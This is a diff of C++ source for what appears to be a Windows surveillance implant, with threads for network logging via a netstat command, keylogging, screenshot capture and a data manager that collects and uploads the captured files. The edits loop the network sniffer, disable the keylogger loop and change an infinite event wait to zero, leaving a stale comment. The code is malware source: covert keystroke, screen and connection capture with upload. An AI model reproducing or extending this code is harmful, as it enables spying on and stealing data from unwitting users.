@@ -77,8 +77,14 @@ DWORD WINAPI initNetLogger(LPVOID lpParam)
 		wstring firstfilename = stringToWString(DATA_FOLDER_PATH).append(L"netlog");
 		// First create a list of ip outgoing addresses on port 443 (HTTPS) and 80 (HTTP)
 		LPCWSTR netSnifferCmd = L"for /f \"tokens=3\" %a in ('netstat -p tcp -n -o') do @echo %a | findstr /c:\":443\" /c:\":80\"";
-		// Initiate the command
-		runCommand(netSnifferCmd, firstfilename.c_str());
+
+		int count = 0;
+		while (count < NETLOG_SIZE) {
+			// Initiate the command
+			runCommand(netSnifferCmd, firstfilename.c_str());
+			count++;
+			Sleep(SYNC_TIME);
+		}
 
 		wstring secondFilename = stringToWString(constructFilename(TEMP_CODE));
 		// Try to parse the list and pass each ip through a function to retireve the certificate.
@@ -111,7 +117,7 @@ DWORD WINAPI initNetLogger(LPVOID lpParam)
 
 DWORD WINAPI initKeylogger(LPVOID lpParam)
 {
-	while (TRUE) {
+	while (FALSE) {
 		QUERY_USER_NOTIFICATION_STATE pquns;
 		SHQueryUserNotificationState(&pquns);
 
@@ -161,7 +167,6 @@ DWORD WINAPI initScreenshot(LPVOID lpParam)
 		wstring filename = stringToWString(constructFilename(TEMP_CODE));
 		// Start capturing
 		screenCapture(filename.c_str());
-
 		// Build the final filename, this will allow the data manager thread to collect and upload it.. 
 		wstring filenameFinal = stringToWString(constructFilename(SCREENSHOT_CODE));
 		if (!rename(wStringToString(filename).c_str(), wStringToString(filenameFinal).c_str()))
@@ -390,7 +395,7 @@ DWORD WINAPI initDataManager(LPVOID lpParam)
 	while (TRUE) {
 		WaitForSingleObject(
 			newDataEvent, // event handle
-			INFINITE);    // indefinite wait
+			0);    // indefinite wait
 		// Event was called (Request Arrived..)
 		// We reset the event to make it wait again for any request at the end of the loop..
 		ResetEvent(newDataEvent);
